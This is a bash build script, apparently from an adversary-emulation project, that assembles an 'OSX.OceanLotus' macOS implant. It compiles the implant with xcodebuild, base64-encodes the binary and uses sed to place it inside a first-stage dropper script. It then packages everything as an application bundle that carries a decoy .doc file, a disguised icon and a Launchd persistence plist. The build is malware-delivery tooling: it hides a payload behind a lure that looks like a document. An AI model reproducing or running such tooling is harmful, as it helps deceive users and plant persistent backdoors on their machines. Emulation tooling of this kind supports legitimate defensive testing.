#!/bin/bash

# ---------------------------------------------------------------------------
# build_osx.oceanlotus.sh - builds all components of the OSX.OceanLotus implant
#                           and should be executed from Resources/OSX.OceanLotus

# Usage: ./build_osx.oceanlotus.sh

# Revision History:

# ---------------------------------------------------------------------------

# build the implant
cd Implant/
xcodebuild -scheme Implant build -configuration Release
build_directory=$(xcodebuild -project Implant.xcodeproj -showBuildSettings | grep -m 1 "CONFIGURATION_BUILD_DIR" | grep -oEi "\/.*")
b64_payload=$(cat $build_directory/Implant | base64)

# update the b64 payload inside the Application Bundle script
cd ../ApplicationBundle
sed -i -E "s:payload=\".*\":payload=\"${b64_payload}\":" first_stage.sh

# build the Application Bundle
./build_bundle.sh -s first_stage.sh -i W8BN.icns -d decoy.doc -p Launchd.plist -n "TestApp"